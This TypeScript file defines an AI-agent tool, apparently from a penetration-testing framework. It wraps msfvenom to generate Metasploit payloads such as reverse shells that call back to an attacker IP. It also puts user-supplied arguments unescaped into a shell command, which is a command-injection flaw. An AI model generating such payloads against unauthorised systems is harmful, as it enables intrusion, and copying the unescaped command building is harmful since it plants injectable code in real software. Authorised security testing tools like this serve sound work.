import { ToolDefinition } from "../types";

const msfvenomPayload: ToolDefinition = {
  name: "msfvenom_payload",
  description:
    "Generate an msfvenom payload. Constructs and executes the msfvenom command " +
    "with the specified parameters to create a payload file on the attack box.",
  parameters: {
    type: "object",
    properties: {
      lhost: { type: "string", description: "Local host IP (attacker IP)" },
      lport: { type: "string", description: "Local port for callback" },
      payload: { type: "string", description: "Metasploit payload (e.g. linux/x64/shell_reverse_tcp)" },
      file_format: { type: "string", description: "Output format (e.g. elf, exe, raw, python)" },
      file_name: { type: "string", description: "Output file name" },
    },
    required: ["lhost", "lport", "payload", "file_format", "file_name"],
  },
  timeoutMs: 60_000,
  async execute(args, ctx) {
    const { lhost, lport, payload, file_format, file_name } = args;
    if (!lhost || !lport || !payload || !file_format || !file_name) {
      return { output: "Error: all msfvenom parameters are required", exitCode: 1 };
    }

    const command = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${file_format} -o /tmp/${file_name}`;
    const { output, exitCode } = await ctx.runCommand(command, this.timeoutMs);
    return { output, exitCode, files: [file_name] };
  },
};

export default msfvenomPayload;
